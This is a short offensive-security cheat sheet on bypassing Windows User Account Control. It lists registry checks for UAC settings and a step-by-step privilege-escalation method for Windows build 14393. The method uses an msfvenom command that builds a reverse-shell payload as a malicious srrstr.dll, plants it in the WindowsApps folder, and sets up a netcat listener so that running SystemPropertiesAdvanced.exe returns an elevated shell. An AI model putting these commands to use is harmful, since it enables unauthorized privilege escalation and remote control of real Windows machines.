# User Account Control (UAC) Bypass

> UAC bypasses leverage flaws or unintended functionality in different Windows builds.
>
> The following repository contains many different UAC Bypassing Techniques: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

## Initial Enumeration

Check if UAC is enabled (0x1=true): `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`

Check the UAC level(0x5=max level): `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`

To check the Windows Build: `[environment]::OSVersion.Version`

Check [this](https://github.com/hfiref0x/UACME) repository and see if anything exists for the target build number

***

## **Example - UAC Bypass in Windows Build 14393**

1. We can basically bypass UAC by placing a malicious `srrstr.dll` DLL to the `WindowsApps` folder, which will be loaded in an elevated context
2. Generate malicious DLL file:\
   `msfvenom -p windows/shell_reverse_tcp LHOST=our-ip LPORT=listening-port -f dll > srrstr.dll`
3. Transfer the DLL on the target machine
4. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
5. Get a reverse shell: `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
